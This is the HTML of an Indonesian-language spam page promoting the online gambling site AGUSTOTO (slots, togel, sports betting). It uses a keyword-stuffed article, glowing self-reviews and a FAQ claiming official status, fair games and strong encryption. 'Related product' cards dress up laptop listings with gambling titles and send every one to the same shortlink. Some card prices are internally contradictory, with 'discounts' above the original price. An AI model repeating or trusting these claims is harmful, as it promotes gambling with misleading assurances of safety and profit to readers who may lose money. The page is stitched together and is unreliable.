  <div class="tnt-comment">"Keamanan data di AGUSTOTO memberi rasa tenang yang luar biasa; fitur enkripsi dan proteksi akun bekerja baik sehingga informasi pribadi dan riwayat transaksi tetap aman, membuat platform ini tampak sangat profesional dan dapat dipercaya."</div>
</div>



</div>
</div>

</aside>
</div>

<style>
.tnt-review-mecha{
  background: radial-gradient(circle at center, #8adeff, #8adeff);
  border: 2px solid #8adeff;
  border-radius: 14px;
  padding: 20px;
  color: #dbdbdb;
  font-family: 'Orbitron', sans-serif;
  position: relative;
  overflow: hidden;
  box-shadow: 0 0 25px #8adeff, inset 0 0 20px rgba(18, 131, 206, 0.3);
}

/* scanline */
.tnt-review-mecha::before{
  content:"";
  position:absolute;
  inset:0;
  background: repeating-linear-gradient(
    to bottom,
    rgba(18, 131, 206, 0.3),
    rgba(18, 131, 206, 0.3) 1px,
    transparent 2px,
    transparent 4px
  );
  pointer-events:none;
}.bank-tab.active, .bank-tab:hover
  

.tnt-header h2{
  font-size: 18px;
  color:#000000;
  text-shadow:0 0 10px #8adeff, 0 0 20px #8adeff;
  margin-bottom:5px;
}

.tnt-header p{
  font-size:12px;
  opacity:0.85;
  margin-bottom:15px;
}

.tnt-slider{
  position:relative;
  height:90px;
}

.tnt-slide{
  position:absolute;
  width:100%;
  opacity:0;
  transform:translateX(40px);
  transition:all .6s ease;
}
  .tenor-badge {
    background: #8adeff;
    color: #fff;
    font-weight: 700;
    min-width: 42px;
    text-align: center;
    padding: .38rem .4rem;
    font-size: .8rem;
    border-radius: 10px;
    box-shadow: 0 3px 10px -4px rgb(18, 131, 206, 0.3);
}

.tnt-slide.active{
  opacity:1;
  transform:translateX(0);
}

.tnt-name{
font-size: 14px;
    color: #000000;
    margin-bottom: 5px;
    text-shadow: 0 0 6px #290000;
}

.tnt-comment{
  font-size:13px;
  line-height:1.5;
}

/* glowing border animation */
@keyframes pulseGlow{
  0%{box-shadow:0 0 10px #8adeff;}
  50%{box-shadow:0 0 25px #8adeff;}
  100%{box-shadow:0 0 10px #8adeff;}
}

.tnt-review-mecha{
  animation:pulseGlow 2.5s infinite;
}
</style>

<script>
let slides = document.querySelectorAll('.tnt-slide');
let index = 0;

setInterval(()=>{
  slides[index].classList.remove('active');
  index = (index + 1) % slides.length;
  slides[index].classList.add('active');
}, 3000);
</script>

        <div class="artikel-glow-KT">

  <div class="artikel-shine"></div>

  <h1>AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat</h1>
<h2>AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat</h2>
<p style="margin:0">Dalam dunia perjudian online, istilah &quot;<a href="https://www.chemtrols.com/steel/">SLOT WD</a>&quot; dan &quot;Terbaik Bandar Togel&quot; sering kali menjadi pusat perhatian para pemain. SLOT WD dikenal sebagai metode pencairan dana yang cepat dan efisien, sementara pilihan tersebut mengacu pada situs taruhan yang memiliki reputasi baik dalam menyediakan layanan togel. Memahami perbedaan ini penting agar Anda dapat memilih platform yang paling sesuai dengan kebutuhan Anda.</p>
<h3>Keuntungan Memilih Situs yang Tepat</h3>
<p style="margin-top:12px">Memilih situs yang tepat seperti AGUSTOTO dapat memberikan Anda banyak keuntungan. Situs yang memiliki reputasi baik biasanya menawarkan keamanan transaksi dan keandalan dalam pembayaran. Selain itu, situs terpercaya sering kali memiliki dukungan pelanggan yang responsif dan berbagai promosi menarik. Dengan memilih situs yang tepat, Anda dapat bermain dengan tenang dan fokus pada strategi permainan Anda. Luangkan waktu untuk membaca ketentuan kecil yang sering terlewat pada pandangan pertama. Jika penjelasannya tidak konsisten, cari sumber pembanding yang lebih mudah diverifikasi.</p>
<h3>Fitur yang Harus Diperhatikan</h3>
<p style="margin-top:12px">Salah satu fitur penting yang perlu diperhatikan adalah metode transaksi yang digunakan, seperti SLOT WD. Metode ini menawarkan kemudahan dalam penarikan dana sehingga Anda dapat menikmati kemenangan dengan cepat. Pastikan juga untuk memeriksa apakah situs tersebut menyediakan fitur &quot;<strong>Slot Gopay Kalut</strong>&quot; yang memungkinkan Anda melakukan transaksi dengan berbagai metode pembayaran yang fleksibel. Catatan sederhana akan memudahkan Anda membandingkan informasi tanpa mengandalkan ingatan. Jangan menjadikan satu klaim promosi sebagai satu-satunya dasar pertimbangan.</p>
<h3>Cara Mendaftar dan Melakukan Deposit</h3>
<p style="margin-top:12px">Proses pendaftaran di situs judi online biasanya sederhana, namun Anda harus memahami setiap langkahnya. Untuk memulai, Anda dapat mencari informasi tentang &quot;<strong>CARA DAFTAR SITUS JUDI</strong>&quot; yang biasanya tersedia di halaman utama situs. Dengan mengikuti panduan ini, Anda dapat memastikan semua informasi yang Anda masukkan benar dan akurat.</p>
<p style="margin-top:12px">Setelah mendaftar, langkah berikutnya adalah melakukan deposit. Beberapa situs menawarkan cara deposit yang mudah, seperti melalui &quot;<strong>CARA SBOBET LOGIN NO 1</strong>&quot;. Metode ini sering kali digunakan oleh para pemain yang sudah berpengalaman dalam berjudi online.</p>
<p style="margin-top:12px">Jika Anda berada di wilayah Pontianak, Anda mungkin tertarik untuk mencoba &quot;<strong>LOGIN PONTIANAK JUDI</strong>&quot;. Fitur ini memungkinkan Anda untuk mengakses berbagai permainan lokal dengan mudah. Dengan akses yang cepat dan mudah, Anda dapat segera mulai bermain dan menikmati berbagai permainan yang ditawarkan.</p>
<p style="margin-top:12px">Selain itu, bagi Anda yang ingin menikmati pengalaman bermain yang lebih interaktif, &quot;<strong>STREAMING JUDI BOLA DEPOSIT PULSA</strong>&quot; bisa menjadi pilihan menarik. Dengan fitur ini, Anda dapat menonton pertandingan secara langsung sambil memasang taruhan, memberikan sensasi yang lebih nyata dalam berjudi.</p>
<p style="margin-top:12px">Pastikan untuk selalu memeriksa syarat dan ketentuan yang berlaku sebelum melakukan deposit. Pengelolaan modal yang baik sangat penting untuk menghindari risiko keuangan yang tidak diinginkan. Periksa kembali angka, batas, dan masa berlaku sebelum mengambil keputusan.</p>
<p style="margin-top:12px">Memilih situs judi online yang tepat seperti AGUSTOTO dan memahami fitur yang ditawarkan adalah langkah awal yang penting dalam perjalanan judi Anda. Dengan pengetahuan tentang layanan tersebut dan pilihan tersebut, Anda dapat membuat keputusan yang lebih cerdas dan menikmati pengalaman bermain yang lebih aman dan menguntungkan. Ingatlah untuk selalu bermain dengan bijak dan mengelola modal Anda dengan baik untuk menghindari risiko yang tidak diinginkan.</p>
</div>

<style>
.artikel-glow-KT{
      max-width: 820px;
    margin: 40px auto;
    padding: 36px;
    box-sizing: border-box;
    position: relative;
    overflow: hidden;
    border-radius: 30px;
    font-family: Arial, sans-serif;
    color: #ffffff;
    background: radial-gradient(circle at top left, rgba(18, 131, 206, 0.3), transparent 20%), radial-gradient(circle at bottom right, rgb(18, 131, 206, 0.3), transparent 28%), linear-gradient(135deg, #8adeff, #8adeff, #8adeff);
    border: 2px solid rgba(255, 255, 255, .55);
    box-shadow: 0 0 25px rgb(18, 131, 206, 0.3), 0 0 55px rgb(18, 131, 206, 0.3), 0 20px 45px rgba(0, 0, 0, .25), inset 0 0 35px rgba(18, 131, 206, 0.3);
}

.artikel-glow-KT:before{
  content:"";
  position:absolute;
  inset:10px;
  border-radius:24px;
  border:1px solid rgba(255,255,255,.32);
  pointer-events:none;
}

.artikel-shine{
  position:absolute;
  top:-120px;
  left:-180px;
  width:280px;
  height:650px;
  background:linear-gradient(120deg,transparent,rgba(255,255,255,.55),transparent);
  transform:rotate(25deg);
  animation:artikelShine 4.5s infinite;
  pointer-events:none;
}

@keyframes artikelShine{
  0%{left:-220px;}
  55%{left:110%;}
  100%{left:110%;}
}

.artikel-glow-KT h1,
.artikel-glow-KT h2{
  position:relative;
  color:#000000;
  text-align:center;
  line-height:1.35;
  text-shadow:
    0 0 8px rgba(18, 131, 206, 0.3 / 95%),
    0 0 18px rgba(18, 131, 206, 0.3),
    0 2px 8px rgba(18, 131, 206, 0.3);
}

.artikel-glow-KT h1{
  font-size:31px;
  margin:0 0 20px;
}

.artikel-glow-KT h2{
  font-size:24px;
  margin:28px 0 14px;
}

.artikel-glow-KT p{
  position:relative;
  margin:0 0 16px;
  color:#f8ffff;
  font-size:15px;
  line-height:1.85;
  text-align:justify;
  text-shadow:0 1px 4px rgba(0,0,0,.28);
}

.artikel-glow-KT a{
  color:#000000;
  font-weight:800;
  text-shadow:0 0 8px rgba(18, 131, 206, 0.3);
}

.artikel-glow-KT img{
  position:relative;
  display:block;
  max-width:100%;
  margin:16px auto 24px;
  border-radius:16px;
  border:1px solid rgba(255,255,255,.55);
  box-shadow:
    0 0 18px rgba(255,255,255,.55),
    0 12px 28px rgba(0,0,0,.28);
}

.artikel-highlight{
  position:relative;
  margin:24px 0;
  padding:22px;
  border-radius:22px;
  background:rgba(255,255,255,.20);
  border:1px solid rgba(255,255,255,.45);
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,.65),
    inset 0 0 22px rgba(255,255,255,.14),
    0 10px 25px rgba(0,0,0,.18);
  backdrop-filter:blur(8px);
}

.artikel-highlight:before{
  content:"";
  position:absolute;
  left:0;
  right:0;
  top:0;
  height:45%;
  border-radius:22px 22px 0 0;
  background:linear-gradient(rgba(255,255,255,.35),rgba(255,255,255,.04));
  pointer-events:none;
}

.artikel-glow-KT ul{
  position:relative;
  margin:15px 0 0 20px;
  padding:0;
}

.artikel-glow-KT li{
  margin-bottom:11px;
  padding:10px 12px;
  border-radius:12px;
  background:rgba(255,255,255,.16);
  color:#ffffff;
  line-height:1.6;
  box-shadow:inset 0 0 10px rgba(255,255,255,.08);
}

@media(max-width:600px){
  .artikel-glow-KT{
    margin:25px 12px;
    padding:25px;
    border-radius:24px;
  }

  .artikel-glow-KT h1{
    font-size:24px;
  }

  .artikel-glow-KT h2{
    font-size:21px;
  }
}
</style>

<div class="KT-faq-rainbow">
  <div class="KT-shine"></div>

  <div class="KT-faq-top">
    <span>â˜… PREMIUM FAQ â˜…</span>
    <h2>Pertanyaan Umum AGUSTOTO</h2>
    
  </div>

  <div class="KT-rainbow-item">
    <button type="button">Apa itu AGUSTOTO dan mengapa dikenal sebagai Link Situs Slot Gacor Resmi & Situs Slot WD Gacor 2026?</button>
    <div class="KT-rainbow-answer">
      <p>AGUSTOTO merupakan platform hiburan digital resmi yang menyediakan jalur akses utama untuk permainan slot interaktif dan pasaran toto tepercaya. Dikenal sebagai penyedia terdepan untuk tahun 2026 karena didukung oleh sistem permainan yang adil, server stabil, serta layanan operasional yang siap melayani pengguna selama 24 jam nonstop.</p>
    </div>
  </div>

  <div class="KT-rainbow-item">
    <button type="button">Bagaimana proses deposit cepat bekerja di AGUSTOTO dan apa manfaatnya bagi pemain?</button>
    <div class="KT-rainbow-answer">
      <p>AGUSTOTO menggunakan alur transaksi otomatis yang terhubung langsung dengan berbagai metode pembayaran lokal. Manfaat utamanya adalah proses pengisian saldo yang praktis dan serba cepat, sehingga pengguna dapat langsung menikmati ragam pilihan slot dan toto tanpa membuang waktu.</p>
    </div>
  </div>

  <div class="KT-rainbow-item">
    <button type="button">Seberapa kuat perlindungan keamanan data di AGUSTOTO dan fitur apa yang digunakan?</button>
    <div class="KT-rainbow-answer">
      <p>Keamanan pengguna menjadi prioritas utama dengan menerapkan teknologi enkripsi data tingkat tinggi. Fitur ini mengamankan seluruh identitas pribadi serta riwayat transaksi finansial pengguna dari potensi gangguan sistem maupun akses tanpa izin.</p>
    </div>
  </div>

  <div class="KT-rainbow-item">
    <button type="button">Apakah layanan pelanggan AGUSTOTO benar-benar tersedia 24 jam nonstop dan saluran apa saja yang bisa digunakan?</button>
    <div class="KT-rainbow-answer">
      <p>Ya, layanan pelanggan AGUSTOTO bersiaga penuh 24 jam nonstop setiap hari. Pengguna dapat langsung berkonsultasi atau meminta bantuan teknis melalui fitur Live Chat resmi di situs web serta saluran media sosial pendukung seperti WhatsApp dan Telegram.</p>
    </div>
  </div>
  <div class="KT-rainbow-item">
    <button type="button">Bagaimana AGUSTOTO memastikan pengalaman login ke situs slot dan toto tetap mudah namun aman?</button>
    <div class="KT-rainbow-answer">
      <p>AGUSTOTO menyediakan infrastruktur link alternatif resmi yang responsif di perangkat mobile maupun desktop. Sistem ini mempermudah alur login pengguna agar tetap lancar tanpa terkendala blokir, sembari menjaga seluruh proses masuk akun tetap dilindungi lapisan keamanan enkripsi.</p>
    </div>
  </div>
</div>

<style>
.KT-faq-rainbow{
      max-width: 760px;
    margin: 40px auto;
    padding: 30px;
    box-sizing: border-box;
    position: relative;
    overflow: hidden;
    border-radius: 32px;
    font-family: Arial, sans-serif;
    background: radial-gradient(circle at 15% 10%, rgba(18, 131, 206, 0.3), transparent 18%), radial-gradient(circle at 85% 15%, rgb(18, 131, 206, 0.3), transparent 25%), radial-gradient(circle at 20% 90%, rgb(18, 131, 206, 0.3), transparent 25%), linear-gradient(135deg, #8adeff, #8adeff, #8adeff, #8adeff);
    border: 2px solid rgba(18, 131, 206, 0.3);
    box-shadow: 0 0 25px rgb(18, 131, 206, 0.3), 0 0 55px rgba(18, 131, 206, 0.3), inset 0 0 35px rgba(18, 131, 206, 0.3);
}

.KT-shine{
  position:absolute;
  top:-90px;
  left:-120px;
  width:260px;
  height:520px;
  background:linear-gradient(120deg,transparent,rgba(255,255,255,.55),transparent);
  transform:rotate(25deg);
  animation:KTShine 4s infinite;
  pointer-events:none;
}

@keyframes KTShine{
  0%{left:-180px;}
  55%{left:110%;}
  100%{left:110%;}
}

.KT-faq-top{
  position:relative;
  text-align:center;
  margin-bottom:24px;
}

.KT-faq-top span{
  display:inline-block;
  padding:8px 22px;
  border-radius:999px;
  background:rgba(185 0 0 / 0%);
  color:#dbdbdb;
  font-size:12px;
  font-weight:900;
  letter-spacing:2px;
  border:1px solid rgba(215 215 215 / 62%);
  box-shadow:inset 0 0 14px rgba(255,255,255,.25);
}

.KT-faq-top h2{
  margin:16px 0 8px;
  color:#000000;
  font-size:34px;
  line-height:1.15;
  text-shadow:
    0 0 10px rgba(18, 131, 206, 0.3),
    0 0 22px rgba(18, 131, 206, 0.3);
}

.KT-faq-top p{
  margin:0;
  color:#f3ffff;
  font-size:14px;
}

.KT-rainbow-item{
  position:relative;
  overflow:hidden;
  margin-bottom:14px;
  border-radius:20px;
  background:rgba(255,255,255,.20);
  border:1px solid rgba(255,255,255,.48);
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,.6),
    0 10px 25px rgba(0,0,0,.18);
  backdrop-filter:blur(10px);
}

.KT-rainbow-item:before{
  content:"";
  position:absolute;
  top:0;
  left:0;
  right:0;
  height:45%;
  background:linear-gradient(rgba(255,255,255,.32),rgba(255,255,255,.04));
  pointer-events:none;
}

.KT-rainbow-item button{
  width:100%;
  padding:18px 58px 18px 20px;
  border:0;
  background: #8adeff;
  color:#dbdbdb;
  text-align:left;
  cursor:pointer;
  font-size:15px;
  font-weight:900;
  position:relative;
  z-index:2;
  text-shadow:0 2px 6px rgba(0,0,0,.35);
}

.KT-rainbow-item button:after{
  content:"+";
  position:absolute;
  right:18px;
  top:50%;
  transform:translateY(-50%);
  width:34px;
  height:34px;
  border-radius:50%;
  background:linear-gradient(135deg,#8adeff, #8adeff);
  color:#d1d1d1;
  text-align:center;
  line-height:34px;
  font-size:24px;
  font-weight:900;
  box-shadow:
    0 0 14px rgba(255,255,255,.8),
    inset 0 -4px 8px rgba(0,0,0,.18);
}

.KT-rainbow-item.active button:after{
  content:"âˆ’";
  background:linear-gradient(135deg,#8adeff, #8adeff);
}

.KT-rainbow-answer{
  max-height:0;
  overflow:hidden;
  transition:max-height .35s ease;
  position:relative;
  z-index:2;
}

.KT-rainbow-item.active .KT-rainbow-answer{
  max-height:170px;
}

.KT-rainbow-answer p{
  margin:0;
  padding:0 20px 18px;
  color:#dbdbdb;
  font-size:14px;
  line-height:1.7;
  text-shadow:0 2px 5px rgba(0 0 0);
}

@media(max-width:600px){
  .KT-faq-rainbow{
    margin:25px 12px;
    padding:22px;
    border-radius:24px;
  }

  .KT-faq-top h2{
    font-size:26px;
  }
}
</style>

<script>
document.querySelectorAll(".KT-rainbow-item button").forEach(function(btn){
  btn.addEventListener("click", function(){
    this.parentElement.classList.toggle("active");
  });
});
</script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap');

.cyber-mecha {
  max-width: 800px;
  margin: 40px auto;

  /* deep luxury red */
  background: radial-gradient(circle at top, #14b1d7, #14b1d7 70%);

  border-radius: 16px;
  border: 1px solid rgba(18, 131, 206, 0.3);

  box-shadow:
    0 0 25px rgba(18, 131, 206, 0.3),
    inset 0 0 20px rgba(18, 131, 206, 0.3);

  padding: 25px;
  font-family: 'Orbitron', sans-serif;
  color: #f7e6e6;
  position: relative;
  overflow: hidden;
}

/* scanline overlay */
.cyber-mecha::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(
    to bottom,
    rgba(255,90,90,0.03),
    rgba(255,90,90,0.03) 1px,
    transparent 1px,
    transparent 3px
  );
  pointer-events: none;
}

.pd-full-desc-title {
  text-align: center;
  font-size: 22px;

  /* elegant muted red */
  color: #8adeff;

  letter-spacing: 2px;
  text-shadow: 0 0 10px rgba(18, 131, 206, 0.3);
  margin-bottom: 20px;
}

.mecha-header h3 {
  text-align: center;
  font-size: 18px;
  color: #8adeff;
  text-shadow: 0 0 8px rgba(18, 131, 206, 0.3);
  margin-bottom: 15px;
}

.mecha-image img {
  width: 100%;
  border-radius: 10px;
  border: 1px solid rgba(18, 131, 206, 0.3);
  box-shadow: 0 0 20px rgba(18, 131, 206, 0.3);
  margin-bottom: 20px;
}

.mecha-content p {
  font-size: 14px;
  line-height: 1.8;
  margin-bottom: 14px;
  color: #8adeff;
}

.glow {
  color: #8adeff;
  text-shadow: 0 0 6px rgba(18, 131, 206, 0.3);
  font-weight: 600;
}

.glow-strong {
  color: #8adeff;
  text-shadow:
    0 0 10px rgba(18, 131, 206, 0.3),
    0 0 20px rgba(18, 131, 206, 0.3);
  font-weight: 700;
}

.final-line {
  margin-top: 18px;
  padding: 10px;
  border: 1px solid rgba(18, 131, 206, 0.3);
  background: rgba(60, 0, 0, 0.25);
  border-radius: 8px;
  text-align: center;
  color: #8adeff;
}
</style>
    
    
    
        <section class="pd-related-full">
        <h2 class="pd-related-title">Produk Terkait</h2>
        <div class="pd-related-grid pd-related-grid--full">
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO">
                    <span class="mini-disc">-2%</span>                </div>
                <div class="info">
                    <h3>AGUSTOTO</h3>
                    <div class="spec-chips">I5 <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 512GB <span class="spec-divider">|</span> RTX3050</div>                    <span class="price">
                        <span class="final">Rp 11.500.000</span>
                                                  <span class="ori">Rp 12.799.000</span>
                                            </span>
                    <span class="sold">Terjual 200+</span>                    <span class="stock-dot low" title="Stok Terbatas"></span>
                </div>
            </a>
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO">
                    <span class="mini-disc">-1%</span>                </div>
                <div class="info">
                    <h3>AGUSTOTO</h3>
                    <div class="spec-chips">I7 <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 512GB <span class="spec-divider">|</span> RTX5050</div>                    <span class="price">
                        <span class="final">Rp 22.887.000</span>
                                                  <span class="ori">Rp 21.999.000</span>
                                            </span>
                    <span class="sold">Terjual 20+</span>                    <span class="stock-dot out" title="Habis"></span>
                </div>
            </a>
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE">
                    <span class="mini-disc">-1%</span>                </div>
                <div class="info">
                    <h3>LOGIN AGUSTOTO</h3>
                    <div class="spec-chips">R7AI <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 1TB <span class="spec-divider">|</span> RTX5060</div>                    <span class="price">
                        <span class="final">Rp 23.600.000</span>
                                                  <span class="ori">Rp 21.399.000</span>
                                            </span>
                    <span class="sold">Terjual 6</span>                    <span class="stock-dot ready" title="Ready"></span>
                </div>
            </a>
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL 4D">
                    <span class="mini-disc">-1%</span>                </div>
                <div class="info">
                    <h3>SLOT GACOR</h3>
                    <div class="spec-chips">R5AI <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 1TB <span class="spec-divider">|</span> RTX5060</div>                    <span class="price">
                        <span class="final">Rp 18.800.000</span>
                                                  <span class="ori">Rp 19.799.000</span>
                                            </span>
                    <span class="sold">Terjual 5</span>                    <span class="stock-dot ready" title="Ready"></span>
                </div>
            </a>
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO">
                    <span class="mini-disc">-1%</span>                </div>
                <div class="info">
                    <h3>Slot WD</h3>
                    <div class="spec-chips">I7 <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 512GB <span class="spec-divider">|</span> RTX5050</div>                    <span class="price">
                        <span class="final">Rp 28.600.080</span>
                                                  <span class="ori">Rp 27.999.000</span>
                                            </span>
                    <span class="sold">Terjual 6</span>                    <span class="stock-dot low" title="Stok Terbatas"></span>
                </div>
            </a>
                        <a class="pd-related-card" href="https://shortt.ink/anakbinjai">
                <div class="thumb">
                    <img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE">
                    <span class="mini-disc">-1%</span>                </div>
                <div class="info">
                    <h3>LINK SLOT</h3>
                    <div class="spec-chips">CORE5 <span class="spec-divider">|</span> 16GB <span class="spec-divider">|</span> 512GB <span class="spec-divider">|</span> RTX4050</div>                    <span class="price">
                        <span class="final">Rp 17.888.000</span>
                                                  <span class="ori">Rp 18.499.000</span>
                                            </span>
                                        <span class="stock-dot low" title="Stok Terbatas"></span>
                </div>
            </a>
                        
                    </div>
    </section>
    
    <div class="pd-mobile-fab" id="pd-mobile-fab" data-pid="325" data-price="20789000" data-voucher-code="" data-voucher-value="0"><div class="mf-actions"><button type="button" class="mf-btn mf-share" id="mf-share" aria-label="Bagikan"><svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg></button><button type="button" class="mf-btn mf-chat" id="mf-chat" aria-label="Tanya Produk"><svg viewBox="0 0 640 640" fill="currentColor"><path d="M320 128C241 128 175.3 185.3 162.3 260.7C171.6 257.7 181.6 256 192 256L208 256C234.5 256 256 277.5 256 304L256 400C256 426.5 234.5 448 208 448L192 448C139 448 96 405 96 352L96 288C96 164.3 196.3 64 320 64C443.7 64 544 164.3 544 288L544 456.1C544 522.4 490.2 576.1 423.9 576.1L336 576L304 576C277.5 576 256 554.5 256 528C256 501.5 277.5 480 304 480L336 480C362.5 480 384 501.5 384 528L384 528L424 528C463.8 528 496 495.8 496 456L496 435.1C481.9 443.3 465.5 447.9 448 447.9L432 447.9C405.5 447.9 384 426.4 384 399.9L384 303.9C384 277.4 405.5 255.9 432 255.9L448 255.9C458.4 255.9 468.3 257.5 477.7 260.6C464.7 185.3 399.1 127.9 320 127.9z"/></svg></button><button type="button" class="mf-btn mf-cart" id="mf-cart" disabled aria-label="Tambah ke keranjang"><svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg></button><button type="button" class="mf-btn mf-buy" id="mf-buy" disabled><span class="mf-buy-text">Beli Sekarang</span><span class="mf-buy-price">Rp 20.789.000</span></button></div></div>

    <button type="button"
            class="pd-scroll-top"
            id="pd-scroll-top"
            aria-label="Kembali ke atas"
            title="Kembali ke atas">
        <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
            <path fill="currentColor" d="M7.41 14.59 12 10l4.59 4.59L18 13.17l-6-6-6 6z"/>
        </svg>
    </button>
</main>

<div class="pd-share-modal-overlay" id="pd-share-modal-overlay"><div class="pd-share-modal"><div class="pd-share-header"><h2 class="pd-share-title">Bagikan Produk</h2><button type="button" class="pd-share-close" id="pd-share-close" aria-label="Tutup"><svg width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button></div><div class="pd-share-body"><div class="pd-share-preview"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO" class="pd-share-preview-img"><div class="pd-share-preview-info"><h3 class="pd-share-preview-name">AGUSTOTO</h3><p class="pd-share-preview-price">Rp 20.789.000</p></div></div><p class="pd-share-label">Bagikan ke</p><div class="pd-share-grid"><a href="#" class="pd-share-option" data-share="whatsapp" target="_blank" rel="noopener"><span class="pd-share-icon pd-share-icon-whatsapp"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.029-.967-.273-.099-.471-.148-.669.149-.198.297-.767.966-.94 1.164-.173.198-.347.223-.644.074-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.52.149-.173.198-.297.298-.495.099-.198.05-.372-.025-.521-.075-.149-.669-1.612-.916-2.206-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.262.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.718 2.006-1.411.248-.694.248-1.29.173-1.411-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.002a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.263c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.887 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.158 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.305-1.654a11.86 11.86 0 005.67 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.485-8.413"/></svg></span><span class="pd-share-name">WhatsApp</span></a><a href="#" class="pd-share-option" data-share="facebook" target="_blank" rel="noopener"><span class="pd-share-icon pd-share-icon-facebook"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></span><span class="pd-share-name">Facebook</span></a><a href="#" class="pd-share-option" data-share="twitter" target="_blank" rel="noopener"><span class="pd-share-icon pd-share-icon-twitter"><svg viewBox="0 0 24 24"><path fill="currentColor" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 